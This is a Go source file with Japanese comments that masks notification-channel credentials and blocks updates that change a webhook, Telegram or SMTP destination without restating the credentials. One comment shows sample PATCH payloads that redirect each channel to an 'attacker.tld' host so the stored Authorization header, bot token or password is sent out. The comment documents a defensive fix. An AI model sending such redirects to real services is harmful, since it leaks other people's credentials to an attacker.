package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix はマスク値の印の接頭辞です。API が認証情報を表示するとき、この接頭辞付きの値で本物を置き換え、
// 更新 API がこの接頭辞付きの値を受け取ったら「保存済みの元の値を変えない」と解釈します。
//
// 空文字や固定の定数ではなく接頭辞を使うのは、識別できる情報を少し添えられるからです
// （MaskedValue を参照）。ユーザーは秘密を貼り直さずに「どのロボットか」を区別できます。
const MaskedPrefix = "__masked__"

// MaskedValue はマスク値を作ります。
//
//	"__masked__"              元の値が短すぎるので、手がかりは出しません
//	"__masked__:…ab12cd"      元の値の末尾 6 文字を、識別の手がかりとして付けます
//
// 末尾 6 文字だけを出すのは意図した選択です。Webhook アドレスの識別情報は末尾にあります（企業 WeChat の key、
// Feishu のロボット id）。接頭辞はロボットごとに同じで、識別の価値がありません。末尾 6 文字では
// 認証情報を復元できませんが、設定者は「自分のあのグループだ」と分かります。
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked は、値がマスク値か（API が表示したあと変更されていないか）を報告します。
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig は設定の複製を返し、そのチャネルの認証情報フィールドをマスク値に置き換えます。
//
// 未知のチャネル種別は元の設定ではなく空の map を返します。チャネル種別を識別できないときに、認証情報を含みうる元の内容を
// そのまま返さず、UI には「設定を表示できない」と出します。
// 認証情報でないフィールドはそのまま残し、UI が普通に表示できるようにします。
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers のような入れ子構造は、全体を 1 つの認証情報として扱います。子キーごとに判定するには、チャネルごとに
		// 「どの子キーが認証情報か」の規則がもう 1 セット要り、複雑さに対して得るものが小さいです。
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials は「宛先アドレスは変わったが、呼び出し側が
// 認証情報フィールドを明示していない」ことを示します。黙って通さず、認証情報を黙って捨てない理由は PrepareConfigUpdate を参照してください。
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 変わった宛先キー
	Missing []string // 明示されていない認証情報キー
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "宛先アドレス（" + strings.Join(e.Changed, "、") + "）が変わりました。認証情報のフィールド（" +
		strings.Join(e.Missing, "、") + "）も同時に記入し直してください。新しい値を入れるか、空欄にして認証情報が不要であることを明示します。" +
		"元の認証情報は古いアドレスにだけ有効です。そのまま使うと、新しいアドレスへ渡すことになります。"
}

// PrepareConfigUpdate はチャネル設定をマージし、「宛先アドレスの変更」という安全に敏感な場合を扱います。
//
// チャネル更新の経路では、素の MergeConfig の代わりにこれを使います。実際に通る経路は次です。
// 宛先アドレス（メッセージをどこへ送るか）と認証情報（どの身分で送るか）は別々のフィールドで、MergeConfig は
// 「言及されていないキー」を一律に保存済みの元の値のまま残します。そのためチャネルを PATCH できる人は、アドレスだけ変えて
// 認証情報に触れなければ、サーバーに保存済みの本物の認証情報を自分の制御するエンドポイントへ送らせられます。
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 元の Authorization ヘッダーがリクエストと一緒に外へ出る
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<本物のToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS のあとユーザー名とパスワードを渡す
//
// この経路は完全に静かで、リダイレクトに依存しません（ホストをまたぐ移動の拒否では止められません）。
// そしてこのパッケージのマスクの目標、「認証情報をブラウザへ表示しない」を直接破ります。
//
// 規則: 宛先キーのどれかが新しい値に変わったら、呼び出し側は認証情報キーのすべてを明示します。
//   - 新しい値を出す → その値を使う
//   - 空文字を明示的に渡す → そのフィールドは認証情報が不要（空にする意味は残す）
//   - マスク値をそのまま返す / そのキーに触れない → 拒否する
//
// 3 番目も拒否するのは、「マスク値」の意味が「古い認証情報をそのまま使う」であり、古い認証情報は
// 古いアドレスにだけ有効だからです。ここでは「認証情報を自動で捨てる」はしません。任意の認証情報フィールド
// （webhook の headers、email の password）が、黙って「認証が無くなったのに API は 200」になります。
// エラーより調査が難しくなります。操作者に 1 回多く記入してもらいます。
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("チャネル種別 %q は登録されていません", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 文字列でない認証情報の値（webhook の headers はオブジェクト）の中にマスクのリテラルが埋まっていると、
	// 呼び出し側が「元の値を保つ」哨兵を構造の内部へ入れています。MergeConfig がマスクと認めるのは「文字列で
	// 接頭辞が付いている」ものだけで、この形は普通のオブジェクトとしてそのまま保存されます。保存先にリテラルの
	// "__masked__" が本当に残り、その後の認証が黙って無効になり、エラーも出ません。拒否します。
	//
	// この検査は先頭に置きます。アドレスが変わっていないときは早く return するので、後ろに置くと
	// 「アドレスを変えた」経路しか覆いません（最初の版はここに置き間違えており、テストが直接見つけました）。
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 本当に変わった宛先キーを探します。マスク値は「変わっていない」と同じです。
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// アドレスは変わっていません。普通のマージです（マスク値は元の値を残し、空文字は消し、それ以外は上書きします）。
		return MergeConfig(stored, incoming), nil
	}

	// アドレスが変わったので、認証情報キーのそれぞれを明示することを要求します。
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers は、文字列でない構造の中にマスク哨兵を埋め込んだ送信を拒否します。
//
// マスクの前提は「値全体が文字列である」ことです。webhook の headers のようなオブジェクトフィールドは、
// 全体をマスクする（文字列 "__masked__" にする）か、全体を送るかです。哨兵をオブジェクトの内部へ入れると、
// 「変えない」を表せず、本物の値として保存されます。
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("フィールド %s の内容にマスク印 %q が含まれています。このフィールドは、全体を空にして従来の値を引き継ぐか、全体を新しい値として送ってください。構造の内部にマスクのプレースホルダを混ぜることはできません",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue は 2 つの設定値が等価かを比較します。JSON シリアライズで比べるのは、型の差も扱うためです。
// フロントが送るポートは number で、保存先から読んだ値は float64 です。直接 == すると誤判定します。
//
// 「空」は比較の前に正規化します。空文字と「キーが無い」は、この設定モデルでは同じ状態です。
// MergeConfig は空文字を明示的な消去として、そのキーを delete するからです。正規化しないと、ずっと空のままの任意の宛先フィールド
// （Telegram の base_url だけがこうです。空なら公式アドレスを使います）が次の経路を通ります。
//
//	作成時に base_url:"" を保存 → 最初の保存で MergeConfig がキーを消す
//	→ 2 回目の保存で incoming は ""、stored にキーが無く、「アドレスが変わった」と判定される
//	→ 認証情報はマスク値 → 400「宛先アドレスが変わりました。認証情報のフィールドも同時に記入し直してください」
//
// その後の保存は毎回失敗します。ユーザーは何も変えていないのに、Bot Token を貼り直すまで直りません。
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue は、設定値が「空」かを判定します。
// 口径は MergeConfig の消去判定と一致させます（strings.TrimSpace(s) == ""）。
// 一致しないと、「MergeConfig は消すと判断し、sameConfigValue は値があると判断する」隙間が生まれます。
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig は incoming を stored の上にマージし、チャネル設定の更新に使います。
//
// 規則:
//   - incoming の値がマスクのキー → stored の元の値を残す（ユーザーはこのフィールドを変えていない）
//   - incoming の値が空文字のキー → 明示的な消去とみなし、そのキーを消す
//   - それ以外のキー → incoming の値で上書きする
//   - stored にあって incoming に無いキー → 残す（部分更新の意味）
//
// 空文字を「消去」とみなすかは明確にします。フロントのフォームは未記入のフィールドを空文字で送ります。
// それを有効な値として書くと、「空欄のまま元の値を残す」フィールドが本当に消えます。
// ここでは明示的な消去を選びます。間違って設定したフィールドを消すとき、ユーザーに他の表現が無いからです
// （フィールドを外すと「未提供」と「空の値を提供」を区別できますが、UI はその区別を使いません）。
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // マスク値 = 未変更。stored を残す
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
